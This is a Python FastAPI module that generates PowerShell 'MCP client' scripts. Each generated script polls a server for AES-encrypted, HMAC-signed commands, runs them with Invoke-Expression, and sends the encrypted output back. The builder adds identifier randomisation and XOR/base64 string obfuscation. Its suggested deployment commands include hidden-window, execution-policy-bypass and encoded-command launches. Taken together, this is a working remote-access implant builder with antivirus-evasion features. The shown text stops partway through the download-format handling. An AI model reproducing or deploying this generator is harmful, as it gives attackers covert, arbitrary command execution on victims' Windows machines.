# api/app/routes_client_builder.py
from __future__ import annotations
from typing import Optional, Dict, Any, Literal, List
import hashlib
import base64
import re
import random
import string
import logging
from datetime import datetime
from fastapi import APIRouter, Depends, HTTPException, Body
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from .deps import get_db
from .auth_dep import require_role
from .models import User

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/client-builder", tags=["client-builder"])

class BuildConfig(BaseModel):
    client_id_prefix: str = Field(default="WS", max_length=10)
    var_prefix: str = Field(default="sys", max_length=20)
    function_prefix: str = Field(default="Invoke", max_length=20)
    crypto_prefix: str = Field(default="Sec", max_length=20)
    interval_seconds: int = Field(default=10, ge=5, le=300)
    skip_tls_verify: bool = Field(default=False)
    debug_mode: bool = Field(default=False)
    custom_user_agent: str = Field(default="PowerShell/1.0", max_length=100)
    obfuscation_level: Literal["base64", "advanced", "elite"] = Field(default="advanced")

class ClientBuildRequest(BaseModel):
    server_url: str = Field(..., max_length=500)
    auth_method: Literal["apikey", "username", "token"] = Field(default="apikey")
    config: BuildConfig = Field(default_factory=BuildConfig)
    additional_params: Optional[str] = Field(default="", max_length=5000)
    download_format: Literal["ps1", "base64", "exe"] = Field(default="ps1")

class GeneratedNames(BaseModel):
    variables: Dict[str, str]
    functions: Dict[str, str]
    constants: Dict[str, str]

class ClientBuildResponse(BaseModel):
    success: bool
    script_content: str
    generated_names: GeneratedNames
    build_id: str
    build_timestamp: str
    stats: Dict[str, Any]
    deployment_commands: Dict[str, str]

class NameGenerator:
    def __init__(self, config: BuildConfig):
        self.config = config
        self.seed = f"{config.var_prefix}{config.obfuscation_level}{datetime.now().isoformat()}"
        
    def _hash_name(self, base: str) -> int:
        combined = f"{base}{self.seed}"
        return int(hashlib.md5(combined.encode()).hexdigest()[:8], 16) % 10000
    
    def _generate_random_suffix(self, length: int = 3) -> str:
        if self.config.obfuscation_level == "elite":
            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        elif self.config.obfuscation_level == "advanced":
            return ''.join(random.choices(string.ascii_letters, k=2))
        return ""
    
    def generate_variable_name(self, original: str) -> str:
        hash_num = self._hash_name(f"var_{original}")
        suffix = self._generate_random_suffix()
        
        if original.startswith("$script:"):
            return f"$script:{self.config.var_prefix}{hash_num}{suffix}"
        elif original.startswith("$Global:"):
            return f"$Global:{self.config.var_prefix}{hash_num}{suffix}"
        elif original.startswith("$"):
            return f"${self.config.var_prefix}{hash_num}{suffix}"
        else:
            return f"{self.config.var_prefix}{hash_num}{suffix}"
    
    def generate_function_name(self, original: str) -> str:
        hash_num = self._hash_name(f"func_{original}")
        suffix = self._generate_random_suffix()
        
        if "-" in original:
            verb, noun = original.split("-", 1)
            return f"{self.config.function_prefix}-{noun[:2]}{hash_num}{suffix}"
        else:
            return f"{self.config.function_prefix}{hash_num}{suffix}"
    
    def generate_constant_name(self, original: str) -> str:
        hash_num = self._hash_name(f"const_{original}")
        suffix = self._generate_random_suffix()
        return f"{self.config.crypto_prefix}{hash_num}{suffix}"

class ClientTemplateGenerator:
    def __init__(self, request: ClientBuildRequest):
        self.request = request
        self.config = request.config
        self.name_gen = NameGenerator(self.config)
        self.generated_names = self._generate_all_names()
        
    def _generate_all_names(self) -> GeneratedNames:
        original_vars = [
            "$script:CRYPTO", "$script:AuthHeader", "$script:AuthMethod",
            "$ServerBaseUrl", "$ClientId", "$IntervalSec", "$DebugMode",
            "$SkipTlsVerify", "$Mode", "$ApiKey", "$EnrollToken", 
            "$Username", "$Password", "$InstructionId", "$pollCount"
        ]
        
        original_funcs = [
            "Invoke-HKDF", "Derive-CryptoFromApiKey", "Encrypt-Text",
            "Decrypt-Text", "Get-HmacSignatureB64", "Test-HmacSignatureB64",
            "Invoke-Api", "Get-ApiToken", "Invoke-Instruction"
        ]
        
        original_constants = [
            "MCPv1-salt", "enc", "mac", "mcp", "crypto", "auth", "poll"
        ]
        
        return GeneratedNames(
            variables={var: self.name_gen.generate_variable_name(var) for var in original_vars},
            functions={func: self.name_gen.generate_function_name(func) for func in original_funcs},
            constants={const: self.name_gen.generate_constant_name(const) for const in original_constants}
        )
    
    def _obfuscate_string(self, text: str) -> str:
        """
        Obfuscation levels:
        - base64: Simple Base64 encoding
        - advanced: String concatenation + Base64 for longer strings
        - elite: XOR encryption + character code substitution
        """
        if self.config.obfuscation_level == "base64":
            # Base64 encoding only
            b64 = base64.b64encode(text.encode()).decode()
            return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{b64}")))'

        elif self.config.obfuscation_level == "advanced":
            # String concatenation + selective Base64
            if len(text) < 10:
                # Short strings: character code substitution
                chars = "+".join([f"[char]{ord(c)}" for c in text])
                return f'({chars})'
            else:
                # Long strings: Base64 with chunking
                b64 = base64.b64encode(text.encode()).decode()
                # Split into chunks for obfuscation
                chunk_size = len(b64) // 3 if len(b64) > 30 else len(b64)
                chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
                chunk_vars = '+'.join([f'"{chunk}"' for chunk in chunks])
                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String({chunk_vars})))'

        else:  # elite
            # XOR encryption + character substitution
            xor_key = random.randint(1, 255)
            encrypted = [ord(c) ^ xor_key for c in text]

            # Convert to character codes with random formatting
            if len(encrypted) < 20:
                # Short: inline character codes
                codes = ",".join([str(c) for c in encrypted])
                return f'(({codes})|ForEach-Object{{[char]($_ -bxor {xor_key})}})-join""'
            else:
                # Long: Base64 + XOR
                b64 = base64.b64encode(text.encode()).decode()
                encrypted_b64 = ''.join([chr(ord(c) ^ xor_key) for c in b64])
                encrypted_b64_encoded = base64.b64encode(encrypted_b64.encode('latin1')).decode()
                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(([Text.Encoding]::Latin1.GetString([Convert]::FromBase64String("{encrypted_b64_encoded}"))|ForEach-Object{{[char]([byte][char]$_ -bxor {xor_key})}})-join"")))'
    
    def _generate_header_comment(self) -> str:
        build_id = hashlib.sha256(f"{self.request.model_dump_json()}{datetime.now()}".encode()).hexdigest()[:16]
        
        return f"""# =======================
#  Generated MCP PowerShell Client
#  Build ID: {build_id}
#  Build Date: {datetime.utcnow().isoformat()}Z
#  Obfuscation: {self.config.obfuscation_level.upper()}
#  Server: {self.request.server_url}
#  Auth: {self.request.auth_method.upper()}
#  
#  Security: AES-256-CBC + HMAC-SHA256 via HKDF
#  Compatibility: PowerShell 5.1+
#  
#  GENERATED - DO NOT EDIT MANUALLY
# ======================="""
    
    def generate_complete_script(self) -> str:
        server_var = self.generated_names.variables["$ServerBaseUrl"]
        client_var = self.generated_names.variables["$ClientId"]
        interval_var = self.generated_names.variables["$IntervalSec"]
        debug_var = self.generated_names.variables["$DebugMode"]
        crypto_var = self.generated_names.variables["$script:CRYPTO"]
        auth_header_var = self.generated_names.variables["$script:AuthHeader"]
        auth_method_var = self.generated_names.variables["$script:AuthMethod"]
        
        hkdf_func = self.generated_names.functions["Invoke-HKDF"]
        derive_func = self.generated_names.functions["Derive-CryptoFromApiKey"]
        encrypt_func = self.generated_names.functions["Encrypt-Text"]
        decrypt_func = self.generated_names.functions["Decrypt-Text"]
        get_hmac_func = self.generated_names.functions["Get-HmacSignatureB64"]
        test_hmac_func = self.generated_names.functions["Test-HmacSignatureB64"]
        api_func = self.generated_names.functions["Invoke-Api"]
        token_func = self.generated_names.functions["Get-ApiToken"]
        exec_func = self.generated_names.functions["Invoke-Instruction"]
        
        script_content = f"""{self._generate_header_comment()}

[CmdletBinding()]
param(
  [string]{server_var} = {self._obfuscate_string(self.request.server_url)},
  [string]{client_var} = {self._obfuscate_string(self.config.client_id_prefix)} + "-" + $env:COMPUTERNAME,
  [ValidateSet('Poll','WebSocket')] [string]$Mode = 'Poll',
  [string]$ApiKey,
  [string]$EnrollToken,
  [string]$Username,
  [string]$Password,
  [int]{interval_var} = {self.config.interval_seconds},
  [switch]$SkipTlsVerify{' = $true' if self.config.skip_tls_verify else ''},
  [switch]{debug_var}{' = $true' if self.config.debug_mode else ''}
)

# ------------- TLS Configuration (WinPS 5.1) -------------
try {{
  [Net.ServicePointManager]::SecurityProtocol =
    [Net.SecurityProtocolType]::Tls   -bor
    [Net.SecurityProtocolType]::Tls11 -bor
    [Net.SecurityProtocolType]::Tls12
}} catch {{ 
  Write-Warning ({self._obfuscate_string("[mcp] Failed to set TLS protocols: ")} + $_.Exception.Message)
}}

[System.Net.ServicePointManager]::CheckCertificateRevocationList = $false
[System.Net.ServicePointManager]::Expect100Continue = $false

if ($SkipTlsVerify) {{
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{ $true }}
  Write-Warning {self._obfuscate_string("[mcp] TLS certificate validation is DISABLED for this process (dev only).")}
}}

# ------------- HKDF Implementation (HMAC-SHA256) -------------
function {hkdf_func}([byte[]]$IkmData, [byte[]]$SaltData, [byte[]]$InfoData, [int]$OutputLen=32){{
  if ({debug_var}) {{ 
    Write-Host ({self._obfuscate_string("[hkdf] IKM length: ")} + $IkmData.Length + {self._obfuscate_string(", Salt length: ")} + $SaltData.Length + {self._obfuscate_string(", Info: ")} + [Text.Encoding]::UTF8.GetString($InfoData))
  }}
  
  $hmacExtract = New-Object System.Security.Cryptography.HMACSHA256
  $hmacExtract.Key = $SaltData
  $PRK = $hmacExtract.ComputeHash($IkmData)
  $hmacExtract.Dispose()

  $output = New-Object byte[] $OutputLen
  $T = $null
  $offset = 0
  $block = 0
  
  while ($offset -lt $OutputLen) {{
    $block++
    $lenT = if ($T) {{ $T.Length }} else {{ 0 }}
    $lenI = if ($InfoData) {{ $InfoData.Length }} else {{ 0 }}
    $input = New-Object byte[] ($lenT + $lenI + 1)
    
    if ($lenT -gt 0) {{ [Buffer]::BlockCopy($T, 0, $input, 0, $lenT) }}
    if ($lenI -gt 0) {{ [Buffer]::BlockCopy($InfoData, 0, $input, $lenT, $lenI) }}
    $input[$lenT + $lenI] = [byte]$block

    $hmacExpand = New-Object System.Security.Cryptography.HMACSHA256
    $hmacExpand.Key = $PRK
    $T = $hmacExpand.ComputeHash($input)
    $hmacExpand.Dispose()

    $copyLen = [Math]::Min($OutputLen - $offset, $T.Length)
    [Array]::Copy($T, 0, $output, $offset, $copyLen)
    $offset += $copyLen
  }}
  
  if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[hkdf] Generated key length: ")} + $output.Length) }}
  return $output
}}

# Global state variables
{crypto_var} = $null
{auth_header_var} = $null
{auth_method_var} = $null

# ------------- Key Derivation -------------
function {derive_func}([string]$ApiKey) {{
  try {{
    $ikm     = [Text.Encoding]::UTF8.GetBytes($ApiKey)
    $salt    = [Text.Encoding]::UTF8.GetBytes({self._obfuscate_string("MCPv1-salt")})
    $encInfo = [Text.Encoding]::UTF8.GetBytes({self._obfuscate_string("enc")})
    $macInfo = [Text.Encoding]::UTF8.GetBytes({self._obfuscate_string("mac")})
    
    $encKey  = {hkdf_func} -IKM $ikm -Salt $salt -Info $encInfo -Len 32
    $macKey  = {hkdf_func} -IKM $ikm -Salt $salt -Info $macInfo -Len 32
    
    if ({debug_var}) {{
      $sha256 = [System.Security.Cryptography.SHA256]::Create()
      $encFP = [Convert]::ToBase64String(($sha256.ComputeHash($encKey))[0..7])
      $macFP = [Convert]::ToBase64String(($sha256.ComputeHash($macKey))[0..7])
      Write-Host ({self._obfuscate_string("[crypto] Derived keys - ENC: ")} + $encFP + {self._obfuscate_string(", MAC: ")} + $macFP)
      $sha256.Dispose()
    }}
    
    return @{{ AES = $encKey; HMAC = $macKey }}
  }} catch {{
    throw ({self._obfuscate_string("Failed to derive crypto keys: ")} + $_.Exception.Message)
  }}
}}

# ------------- Crypto Functions -------------
function {encrypt_func}([string]$PlainText){{
  if (-not {crypto_var}) {{
    throw {self._obfuscate_string("No crypto keys available. Client may need re-authentication.")}
  }}
  
  try {{
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = {crypto_var}.AES
    $aes.GenerateIV()
    
    $enc = $aes.CreateEncryptor()
    $plainBytes = [Text.Encoding]::UTF8.GetBytes($PlainText)
    $cipherBytes = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    
    $all = New-Object byte[] ($aes.IV.Length + $cipherBytes.Length)
    [Array]::Copy($aes.IV, 0, $all, 0, 16)
    [Array]::Copy($cipherBytes, 0, $all, 16, $cipherBytes.Length)
    
    $aes.Dispose()
    $enc.Dispose()
    
    $result = [Convert]::ToBase64String($all)
    if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[encrypt] Encrypted ")} + $plainBytes.Length + {self._obfuscate_string(" bytes to ")} + $all.Length + {self._obfuscate_string(" bytes")}) }}
    return $result
  }} catch {{
    throw ({self._obfuscate_string("Encryption failed: ")} + $_.Exception.Message)
  }}
}}

function {decrypt_func}([string]$CipherTextB64){{
  if (-not {crypto_var}) {{
    throw {self._obfuscate_string("No crypto keys available. Client may need re-authentication.")}
  }}
  
  try {{
    $raw = [Convert]::FromBase64String($CipherTextB64)
    if ($raw.Length -lt 17) {{ throw {self._obfuscate_string("Ciphertext too short (need IV + data)")} }}
    
    $iv = New-Object byte[] 16
    [Buffer]::BlockCopy($raw, 0, $iv, 0, 16)
    $ctLen = $raw.Length - 16
    $ct = New-Object byte[] $ctLen
    [Buffer]::BlockCopy($raw, 16, $ct, 0, $ctLen)
    
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = {crypto_var}.AES
    $aes.IV = $iv
    
    $dec = $aes.CreateDecryptor()
    $plainBytes = $dec.TransformFinalBlock($ct, 0, $ct.Length)
    
    $aes.Dispose()
    $dec.Dispose()
    
    $result = [Text.Encoding]::UTF8.GetString($plainBytes)
    if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[decrypt] Decrypted ")} + $raw.Length + {self._obfuscate_string(" bytes to ")} + $plainBytes.Length + {self._obfuscate_string(" bytes")}) }}
    return $result
  }} catch {{
    throw ({self._obfuscate_string("Decryption failed: ")} + $_.Exception.Message)
  }}
}}

function {get_hmac_func}([string]$Message){{
  if (-not {crypto_var}) {{
    throw {self._obfuscate_string("No crypto keys available for HMAC")}
  }}
  
  try {{
    $msgBytes = [Text.Encoding]::UTF8.GetBytes($Message)
    $h = New-Object System.Security.Cryptography.HMACSHA256
    $h.Key = {crypto_var}.HMAC
    $mac = $h.ComputeHash($msgBytes)
    $h.Dispose()
    
    $result = [Convert]::ToBase64String($mac)
    if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[hmac] Generated HMAC for ")} + $msgBytes.Length + {self._obfuscate_string(" bytes")}) }}
    return $result
  }} catch {{
    throw ({self._obfuscate_string("HMAC generation failed: ")} + $_.Exception.Message)
  }}
}}

function {test_hmac_func}([string]$Message, [string]$Kid, [string]$SigB64){{
  if (-not {crypto_var}) {{
    Write-Warning {self._obfuscate_string("[mcp] No crypto keys available for HMAC verification")}
    return $false
  }}
  
  if ($Kid -ne 'v1') {{
    Write-Warning ({self._obfuscate_string("[mcp] Unexpected kid '")} + $Kid + {self._obfuscate_string("' (expected 'v1')")})
    return $false
  }}
  
  try {{
    $msgRaw = $Message
    $msgLF  = $Message -replace "`r`n","`n"
    $msgCRLF= $msgLF   -replace "`n","`r`n"
    
    $expRaw  = {get_hmac_func} -Message $msgRaw
    if ($expRaw -eq $SigB64) {{ 
      if ({debug_var}) {{ Write-Host {self._obfuscate_string("[hmac] HMAC verified (raw)")} }}
      return $true 
    }}
    
    $expLF   = {get_hmac_func} -Message $msgLF
    if ($expLF -eq $SigB64) {{ 
      Write-Warning {self._obfuscate_string("[mcp] HMAC matched after LF normalization")}
      return $true 
    }}
    
    $expCRLF = {get_hmac_func} -Message $msgCRLF
    if ($expCRLF -eq $SigB64) {{ 
      Write-Warning {self._obfuscate_string("[mcp] HMAC matched after CRLF normalization")}
      return $true 
    }}

    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $keyFP  = [Convert]::ToBase64String(($sha256.ComputeHash({crypto_var}.HMAC))[0..7])
    $msgFP  = [Convert]::ToBase64String(($sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($msgRaw)))[0..7])
    $sigHead = if ($SigB64.Length -ge 16) {{ $SigB64.Substring(0,16) }} else {{ $SigB64 }}
    $sha256.Dispose()
    
    Write-Warning ({self._obfuscate_string("[mcp] HMAC mismatch. kid=")} + $Kid + {self._obfuscate_string(" keyFP=")} + $keyFP)
    return $false
  }} catch {{
    Write-Warning ({self._obfuscate_string("[mcp] HMAC verification error: ")} + $_.Exception.Message)
    return $false
  }}
}}

# ------------- REST API Helper -------------
function {api_func} {{
  param(
    [Parameter(Mandatory)][ValidateSet('GET','POST')] [string]$Method,
    [Parameter(Mandatory)][string]$Path,
    [hashtable]$Headers,
    [object]$Body
  )
  
  $uri = ({server_var}.TrimEnd('/')) + $Path
  $h = @{{}}
  if ($Headers) {{ $Headers.GetEnumerator() | ForEach-Object {{ $h[$_.Key] = $_.Value }} }}

  if ({debug_var}) {{
    Write-Host ({self._obfuscate_string("[api] ")} + $Method + " " + $uri)
  }}

  try {{
    if ($Method -eq 'GET') {{
      return Invoke-RestMethod -Uri $uri -Headers $h -Method Get -ErrorAction Stop
    }} else {{
      if (-not $h.ContainsKey('Content-Type')) {{ $h['Content-Type'] = 'application/json' }}
      $json = if ($null -ne $Body) {{ ($Body | ConvertTo-Json -Depth 10) }} else {{ '{{}}' }}
      
      return Invoke-RestMethod -Uri $uri -Headers $h -Method Post -Body $json -ErrorAction Stop
    }}
  }} catch {{
    Write-Warning ({self._obfuscate_string("[api] ")} + $Method + " " + $uri + {self._obfuscate_string(" failed")})
    throw ({self._obfuscate_string("API ")} + $Method + " " + $uri + {self._obfuscate_string(" failed: ")} + $_.Exception.Message)
  }}
}}

# ------------- Token Acquisition -------------
function {token_func} {{
  param(
    [Parameter(Mandatory)][string]$ServerBaseUrl,
    [Parameter(Mandatory)][string]$ClientId,
    [string]$Username,
    [string]$Password,
    [string]$EnrollToken,
    [string]$ApiKey
  )

  if ($ApiKey) {{
    try {{
      $headers = @{{
        {self._obfuscate_string("Authorization")} = {self._obfuscate_string("ApiKey ")} + $ApiKey
        {self._obfuscate_string("X-MCP-ClientId")} = $ClientId
        {self._obfuscate_string("Content-Type")} = {self._obfuscate_string("application/json")}
      }}
      
      $body = @{{ api_key = $ApiKey; client_id = $ClientId }}
      
      Write-Host {self._obfuscate_string("[mcp] Attempting API key authentication...")}
      $res = {api_func} -Method POST -Path {self._obfuscate_string("/api/auth/token-by-apikey")} -Headers $headers -Body $body
      
      if ($res.access_token) {{ 
        {auth_method_var} = {self._obfuscate_string("ApiKey")}
        Write-Host ({self._obfuscate_string("[mcp] API key authentication successful")})
        return $res.access_token 
      }}
      throw {self._obfuscate_string("API key exchange returned no access_token")}
    }} catch {{
      Write-Warning ({self._obfuscate_string("[mcp] API key auth failed: ")} + $_.Exception.Message)
      throw $_
    }}
  }}

  if ($EnrollToken) {{
    try {{
      $path = {self._obfuscate_string("/api/auth/token?enroll=")} + [Uri]::EscapeDataString($EnrollToken) + {self._obfuscate_string("&client_id=")} + [Uri]::EscapeDataString($ClientId)
      $res = {api_func} -Method POST -Path $path
      if ($res.access_token) {{ 
        {auth_method_var} = {self._obfuscate_string("EnrollToken")}
        return $res.access_token 
      }}
      throw {self._obfuscate_string("Enroll exchange returned no access_token")}
    }} catch {{
      Write-Warning ({self._obfuscate_string("[mcp] Enroll token auth failed: ")} + $_.Exception.Message)
      throw $_
    }}
  }}

  if ($Username -and $Password) {{
    try {{
      $res = {api_func} -Method POST -Path {self._obfuscate_string("/api/auth/token")} -Body @{{ username=$Username; password=$Password }}
      if ($res.access_token) {{ 
        {auth_method_var} = {self._obfuscate_string("UsernamePassword")}
        return $res.access_token 
      }}
      throw {self._obfuscate_string("Auth returned no access_token")}
    }} catch {{
      Write-Warning ({self._obfuscate_string("[mcp] Username/password auth failed: ")} + $_.Exception.Message)
      throw $_
    }}
  }}

  throw {self._obfuscate_string("Choose one auth method: -ApiKey OR -EnrollToken OR -Username/-Password.")}
}}

# ------------- Command Execution -------------
function {exec_func}([string]$CommandText){{
  try {{
    if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[exec] Executing: ")} + $CommandText) }}
    
    $Error.Clear()
    $old = $ErrorActionPreference
    $ErrorActionPreference = 'Stop'
    
    $result = Invoke-Expression -Command $CommandText | Out-String -Width 2000
    $ErrorActionPreference = $old
    
    if (-not $result) {{ $result = {self._obfuscate_string("<no output>")} }}
    
    if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[exec] Success: ")} + $result.Length + {self._obfuscate_string(" characters")}) }}
    return @{{ ok=$true; output=$result }}
  }} catch {{
    if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[exec] Error: ")} + $_.Exception.Message) }}
    return @{{ ok=$false; output=({self._obfuscate_string("ERROR: ")} + $_.Exception.Message) }}
  }}
}}

# ------------- Main Script -------------
Write-Host {self._obfuscate_string("=== MCP PowerShell Client ===")} -ForegroundColor Green
Write-Host ({self._obfuscate_string("[mcp] ClientId: ")} + {client_var})
Write-Host ({self._obfuscate_string("[mcp] Mode: ")} + $Mode)
Write-Host ({self._obfuscate_string("[mcp] Server: ")} + {server_var})
Write-Host ({self._obfuscate_string("[mcp] Debug: ")} + {debug_var})

if (-not $ApiKey -and -not $EnrollToken -and (-not $Username -or -not $Password)) {{
  Write-Error {self._obfuscate_string("[mcp] Must specify one auth method: -ApiKey, -EnrollToken, or -Username/-Password")}
  exit 1
}}

try {{
  Write-Host {self._obfuscate_string("[mcp] Authenticating...")} -ForegroundColor Yellow
  $token = {token_func} -ServerBaseUrl {server_var} -ClientId {client_var} -Username $Username -Password $Password -EnrollToken $EnrollToken -ApiKey $ApiKey
  {auth_header_var} = {self._obfuscate_string("Bearer ")} + $token
  
  if ({auth_method_var} -eq {self._obfuscate_string("ApiKey")} -and $ApiKey) {{
    Write-Host {self._obfuscate_string("[mcp] Deriving encryption keys...")} -ForegroundColor Yellow
    {crypto_var} = {derive_func} -ApiKey $ApiKey
    Write-Host {self._obfuscate_string("[mcp] Encryption keys derived")} -ForegroundColor Green
  }} else {{
    Write-Host ({self._obfuscate_string("[mcp] Auth method: ")} + {auth_method_var} + {self._obfuscate_string(" - no local key derivation")}) -ForegroundColor Yellow
  }}

  try {{
    Write-Host {self._obfuscate_string("[mcp] Sending heartbeat...")} -ForegroundColor Yellow
    $null = {api_func} -Method POST -Path {self._obfuscate_string("/api/clients/heartbeat")} -Headers @{{ Authorization = {auth_header_var} }} -Body @{{ client_id = {client_var} }}
    Write-Host {self._obfuscate_string("[mcp] Heartbeat sent successfully")} -ForegroundColor Green
  }} catch {{
    Write-Warning ({self._obfuscate_string("[mcp] Heartbeat failed: ")} + $_.Exception.Message)
  }}

  Write-Host {self._obfuscate_string("[mcp] Authentication complete. Ready for polling.")} -ForegroundColor Green
}} catch {{
  Write-Error ({self._obfuscate_string("[mcp] Authentication failed: ")} + $_.Exception.Message)
  exit 1
}}

if ($Mode -eq 'Poll') {{
  Write-Host {self._obfuscate_string("[mcp] Starting POLL loop...")} -ForegroundColor Cyan
  Write-Host ({self._obfuscate_string("[mcp] Polling interval: ")} + {interval_var} + {self._obfuscate_string(" seconds")}) -ForegroundColor Cyan
  Write-Host {self._obfuscate_string("[mcp] Press Ctrl+C to stop")} -ForegroundColor Cyan
  
  $pollCount = 0
  
  while ($true) {{
    try {{
      $pollCount++
      if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[poll] #")} + $pollCount + {self._obfuscate_string(" - Checking for instructions...")}) }}
      
      $headers = @{{ Authorization = {auth_header_var}; {self._obfuscate_string("User-Agent")} = {self._obfuscate_string(self.config.custom_user_agent)} }}
      $path = {self._obfuscate_string("/api/get-instruction?client_id=")} + [Uri]::EscapeDataString({client_var})
      $uri = ({server_var}.TrimEnd('/')) + $path

      $wr = Invoke-WebRequest -Uri $uri -Headers $headers -Method Get -UseBasicParsing -ErrorAction Stop
      
      if ($wr.StatusCode -eq 204) {{
        if ({debug_var}) {{ Write-Host {self._obfuscate_string("[poll] No instructions available")} }}
        Start-Sleep -Seconds {interval_var}
        continue
      }}
      
      $resp = $wr.Content | ConvertFrom-Json
      $InstructionId = [string]$resp.id
      $kid = [string]$resp.kid
      $sig = [string]$resp.sig
      $enc = [string]$resp.encryptedCommand

      Write-Host ({self._obfuscate_string("[mcp] Received instruction ")} + $InstructionId) -ForegroundColor Cyan

      $cmd = $null
      try {{
        $cmd = {decrypt_func} -CipherTextB64 $enc
        if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[decrypt] Command: ")} + $cmd.Substring(0, [Math]::Min(100, $cmd.Length))) }}
      }} catch {{
        Write-Warning ({self._obfuscate_string("[mcp] Decrypt failed for instruction ")} + $InstructionId + {self._obfuscate_string(": ")} + $_.Exception.Message)

        # Try to send error result
        try {{
          $errResult = {encrypt_func} -PlainText ({self._obfuscate_string("ERROR: Decryption failed - ")} + $_.Exception.Message)
          $errBody = @{{ id = $InstructionId; client_id = {client_var}; encryptedResult = $errResult }}
          $null = {api_func} -Method POST -Path {self._obfuscate_string("/api/send-result")} -Headers @{{ Authorization = {auth_header_var} }} -Body $errBody
        }} catch {{
          Write-Warning ({self._obfuscate_string("[mcp] Failed to send decryption error result")})
        }}

        Start-Sleep -Seconds {interval_var}
        continue
      }}

      if (-not ({test_hmac_func} -Message $cmd -Kid $kid -SigB64 $sig)) {{
        Write-Warning ({self._obfuscate_string("[mcp] HMAC verification FAILED for instruction ")} + $InstructionId + {self._obfuscate_string("; skipping.")})

        # Try to send HMAC error result
        try {{
          $errResult = {encrypt_func} -PlainText {self._obfuscate_string("ERROR: HMAC verification failed - possible tampering or key mismatch")}
          $errBody = @{{ id = $InstructionId; client_id = {client_var}; encryptedResult = $errResult }}
          $null = {api_func} -Method POST -Path {self._obfuscate_string("/api/send-result")} -Headers @{{ Authorization = {auth_header_var} }} -Body $errBody
        }} catch {{
          Write-Warning ({self._obfuscate_string("[mcp] Failed to send HMAC error result")})
        }}

        Start-Sleep -Seconds {interval_var}
        continue
      }}

      Write-Host ({self._obfuscate_string("[mcp] Executing instruction: ")} + $cmd) -ForegroundColor Yellow
      
      $exec = {exec_func} -CommandText $cmd
      $payloadText = if ($exec.ok) {{ $exec.output }} else {{ $exec.output }}
      
      if ($exec.ok) {{
        Write-Host {self._obfuscate_string("[mcp] Command executed successfully")} -ForegroundColor Green
      }} else {{
        Write-Warning {self._obfuscate_string("[mcp] Command execution failed")}
      }}

      try {{
        $encResult = {encrypt_func} -PlainText $payloadText
        $body = @{{ 
          id = $InstructionId
          client_id = {client_var}
          encryptedResult = $encResult 
        }}

        $null = {api_func} -Method POST -Path {self._obfuscate_string("/api/send-result")} -Headers @{{ Authorization = {auth_header_var} }} -Body $body
        Write-Host ({self._obfuscate_string("[mcp] Result sent for instruction ")} + $InstructionId) -ForegroundColor Green
      }} catch {{
        Write-Warning ({self._obfuscate_string("[mcp] Failed to send result for ")} + $InstructionId + {self._obfuscate_string(": ")} + $_.Exception.Message)
      }}

      Start-Sleep -Seconds 1
    }} catch {{
      Write-Warning ({self._obfuscate_string("[mcp] Poll error: ")} + $_.Exception.Message)
      Start-Sleep -Seconds {interval_var}
    }}
  }}
}} else {{
  Write-Error {self._obfuscate_string("[mcp] WebSocket mode not implemented. Use -Mode Poll.")}
  exit 1
}}

{self.request.additional_params if self.request.additional_params else "# No additional parameters specified"}
"""
        
        return script_content

@router.post("/generate", response_model=ClientBuildResponse)
def generate_client(
    request: ClientBuildRequest = Body(...),
    user = Depends(require_role()),
    db: Session = Depends(get_db)
):
    try:
        log.info(f"[client-builder] Generating client for user {getattr(user, 'username', 'unknown')}")
        
        generator = ClientTemplateGenerator(request)
        script_content = generator.generate_complete_script()
        
        build_id = hashlib.sha256(
            f"{request.model_dump_json()}{datetime.utcnow()}".encode()
        ).hexdigest()[:16]
        
        build_timestamp = datetime.utcnow().isoformat() + "Z"
        
        lines = script_content.split('\n')
        stats = {
            "total_lines": len(lines),
            "code_lines": len([l for l in lines if l.strip() and not l.strip().startswith('#')]),
            "comment_lines": len([l for l in lines if l.strip().startswith('#')]),
            "functions": len(set(re.findall(r'function\s+([\w-]+)', script_content))),
            "variables": len(set(re.findall(r'\$[\w:]+', script_content))),
            "size_bytes": len(script_content.encode('utf-8')),
            "size_kb": round(len(script_content.encode('utf-8')) / 1024, 2),
            "obfuscation_level": request.config.obfuscation_level,
            "estimated_execution_time": "5-15 seconds",
            "crypto_functions": ["HKDF", "AES-256-CBC", "HMAC-SHA256"],
            "auth_methods": ["ApiKey", "EnrollToken", "UsernamePassword"],
            "compatibility": "PowerShell 5.1+"
        }
        
        deployment_commands = {
            "basic": f'powershell.exe -ExecutionPolicy Bypass -File .\\mcp-client.ps1 -ServerBaseUrl "{request.server_url}" -ApiKey "YOUR_API_KEY"',
            "hidden": f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File .\\mcp-client.ps1 -ServerBaseUrl "{request.server_url}" -ApiKey "YOUR_API_KEY"',
            "username_password": f'powershell.exe -ExecutionPolicy Bypass -File .\\mcp-client.ps1 -ServerBaseUrl "{request.server_url}" -Username "admin" -Password "password"',
            "base64_execution": 'powershell.exe -EncodedCommand [BASE64_ENCODED_SCRIPT]'
        }
        
        if request.download_format == "base64":
            utf16_bytes = script_content.encode('utf-16le')
